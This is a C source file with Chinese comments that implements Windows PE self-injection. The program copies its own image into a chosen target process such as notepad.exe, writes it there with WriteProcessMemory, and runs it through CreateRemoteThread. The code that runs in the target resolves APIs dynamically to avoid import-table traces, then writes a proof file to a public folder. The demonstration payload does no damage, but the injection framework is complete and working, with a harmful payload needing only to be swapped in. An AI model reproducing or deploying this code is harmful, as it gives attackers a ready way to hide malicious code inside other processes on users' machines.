/*
 * PE Injection - Self Injection (Loaded Module Reflection)
 *
 * 注入器将自己复制到目标进程
 * 参考：https://github.com/AlSch092/PE-Injection
 *
 * 核心原理：
 * 1. Main函数被调用两次（本地进程+目标进程）
 * 2. 使用全局变量 g_Inserted 区分运行上下文
 * 3. 在本地进程中：复制自己到目标进程
 * 4. 在目标进程中：执行payload逻辑
 */

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>

// 全局变量：标记是否已注入
BOOL g_Inserted = FALSE;

// 前向声明
int main(int argc, char** argv);
DWORD GetProcessIdByName(const char* processName);

// 根据进程名获取 PID
DWORD GetProcessIdByName(const char* processName)
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// 复制当前进程映像到目标进程
BOOL CopyImageToTargetProcess(DWORD processId)
{
    if (g_Inserted)
        return FALSE;

    DWORD dwOldProt = 0;
    HANDLE hProcess = GetCurrentProcess();
    HMODULE hModule = GetModuleHandle(NULL);
    LPVOID baseAddress = hModule;

    // 获取当前映像大小
    MODULEINFO moduleInfo;
    GetModuleInformation(hProcess, hModule, &moduleInfo, sizeof(MODULEINFO));
    SIZE_T imageSize = moduleInfo.SizeOfImage;

    printf("[*] 当前进程映像大小: %lu 字节\n", (unsigned long)imageSize);

    // 打开目标进程
    HANDLE targetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (targetProc == NULL) {
        printf("[!] 无法打开目标进程: %lu\n", GetLastError());
        return FALSE;
    }

    // 在目标进程分配内存
    LPVOID newImageAddress = VirtualAllocEx(targetProc, NULL, imageSize,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_EXECUTE_READWRITE);
    if (!newImageAddress) {
        printf("[!] VirtualAllocEx 失败: %lu\n", GetLastError());
        CloseHandle(targetProc);
        return FALSE;
    }

    printf("[+] 远程内存分配: 0x%p\n", newImageAddress);

    // 创建影子缓冲区
    BYTE* shadow_proc = (BYTE*)malloc(imageSize);
    if (!shadow_proc) {
        printf("[!] 内存分配失败\n");
        CloseHandle(targetProc);
        return FALSE;
    }

    // 设置标志（必须在memcpy之前）
    g_Inserted = TRUE;

    // 修改 ImageBase
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)baseAddress + pDosHeader->e_lfanew);

    if (!VirtualProtect(pNtHeaders, sizeof(IMAGE_NT_HEADERS), PAGE_EXECUTE_READWRITE, &dwOldProt)) {
        printf("[!] VirtualProtect 失败: %lu\n", GetLastError());
        g_Inserted = FALSE;
        free(shadow_proc);
        CloseHandle(targetProc);
        return FALSE;
    }

    pNtHeaders->OptionalHeader.ImageBase = (DWORD_PTR)newImageAddress;

    // 复制整个映像到影子缓冲区
    memcpy(shadow_proc, baseAddress, imageSize);

    // 恢复保护
    if (!VirtualProtect(pNtHeaders, sizeof(IMAGE_NT_HEADERS), dwOldProt, &dwOldProt)) {
        printf("[!] VirtualProtect 恢复失败: %lu\n", GetLastError());
        g_Inserted = FALSE;
        free(shadow_proc);
        CloseHandle(targetProc);
        return FALSE;
    }

    // 写入目标进程
    SIZE_T nBytesWritten;
    if (!WriteProcessMemory(targetProc, newImageAddress, shadow_proc, imageSize, &nBytesWritten)) {
        printf("[!] WriteProcessMemory 失败: %lu\n", GetLastError());
        g_Inserted = FALSE;
        free(shadow_proc);
        CloseHandle(targetProc);
        return FALSE;
    }

    printf("[+] 已写入 %lu 字节\n", (unsigned long)nBytesWritten);

    // 修改内存保护
    if (!VirtualProtectEx(targetProc, newImageAddress, imageSize, PAGE_EXECUTE_READ, &dwOldProt)) {
        printf("[!] VirtualProtectEx 失败: %lu\n", GetLastError());
        g_Inserted = FALSE;
        free(shadow_proc);
        CloseHandle(targetProc);
        return FALSE;
    }

    // 计算 main 函数偏移
    UINT64 mainFuncOffset = (UINT64)main - (UINT64)moduleInfo.lpBaseOfDll;
    UINT64 rebased_main = (UINT64)newImageAddress + mainFuncOffset;

    printf("[*] Main 偏移: 0x%llX\n", mainFuncOffset);
    printf("[*] 远程 Main: 0x%llX\n", rebased_main);

    // 创建远程线程
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(targetProc, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)rebased_main,
                                       NULL, 0, &threadId);
    if (!hThread) {
        printf("[!] CreateRemoteThread 失败: %lu\n", GetLastError());
        g_Inserted = FALSE;
        free(shadow_proc);
        CloseHandle(targetProc);
        return FALSE;
    }

    printf("[+] 远程线程已创建: TID=%lu\n", threadId);
    printf("[+] PE 注入成功!\n");

    free(shadow_proc);
    CloseHandle(hThread);
    CloseHandle(targetProc);

    return TRUE;
}

// Main 函数（被调用两次）
int main(int argc, char** argv)
{
    if (!g_Inserted) {
        // 第一次调用：在本地进程中
        printf("========================================\n");
        printf("  PE Injection - Self Injection\n");
        printf("  将自身注入到目标进程\n");
        printf("========================================\n\n");

        if (argc != 2) {
            printf("用法: %s <目标进程名或PID>\n", argv[0]);
            printf("示例: %s notepad.exe\n", argv[0]);
            printf("      %s 1234\n", argv[0]);
            return 1;
        }

        // 解析目标进程
        DWORD targetPid = 0;
        if (isdigit(argv[1][0])) {
            targetPid = atoi(argv[1]);
        } else {
            targetPid = GetProcessIdByName(argv[1]);
            if (targetPid == 0) {
                printf("[!] 未找到进程: %s\n", argv[1]);
                return 1;
            }
        }

        printf("[*] 目标进程 PID: %lu\n\n", targetPid);

        // 执行注入
        if (CopyImageToTargetProcess(targetPid)) {
            printf("\n[+] 注入完成！本地进程退出。\n");
            return 0;
        } else {
            printf("\n[!] 注入失败！\n");
            return 1;
        }
    }

    // 第二次调用：在目标进程中
    // 以下代码只在目标进程中执行

    // 动态解析 API（避免 IAT 依赖）
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return 1;

    typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    typedef DWORD (WINAPI *pGetCurrentProcessId)(VOID);

    pCreateFileA _CreateFileA = (pCreateFileA)GetProcAddress(hKernel32, "CreateFileA");
    pWriteFile _WriteFile = (pWriteFile)GetProcAddress(hKernel32, "WriteFile");
    pCloseHandle _CloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    pGetCurrentProcessId _GetCurrentProcessId = (pGetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");

    if (!_CreateFileA || !_WriteFile || !_CloseHandle || !_GetCurrentProcessId) {
        return 2;
    }

    // 获取当前进程ID
    DWORD processId = _GetCurrentProcessId();

    // 创建验证文件
    HANDLE hFile = _CreateFileA(
        "C:\\Users\\Public\\pe_injection_verified.txt",
        0x40000000, // GENERIC_WRITE
        0,
        NULL,
        2, // CREATE_ALWAYS
        0x80, // FILE_ATTRIBUTE_NORMAL
        NULL
    );

    if (hFile != (HANDLE)-1) {
        const char* msg = "PE Injection Verified!\r\n"
                         "Process ID: ";
        DWORD written;

        // 计算长度并写入
        int len = 0;
        while (msg[len]) len++;
        _WriteFile(hFile, msg, len, &written, NULL);

        // 写入PID
        char pidStr[16];
        int idx = 0;
        DWORD temp = processId;
        if (temp == 0) pidStr[idx++] = '0';
        else {
            char tempBuf[16];
            int tempIdx = 0;
            while (temp > 0) {
                tempBuf[tempIdx++] = '0' + (temp % 10);
                temp /= 10;
            }
            while (tempIdx > 0) {
                pidStr[idx++] = tempBuf[--tempIdx];
            }
        }
        _WriteFile(hFile, pidStr, idx, &written, NULL);

        const char* msg2 = "\r\nTechnique: PE Injection (Loaded Module Reflection)\r\n"
                          "Method: Self-injection with dynamic API resolution\r\n"
                          "Status: Successfully executed in target process!\r\n";
        len = 0;
        while (msg2[len]) len++;
        _WriteFile(hFile, msg2, len, &written, NULL);

        _CloseHandle(hFile);
    }

    return 0;
}
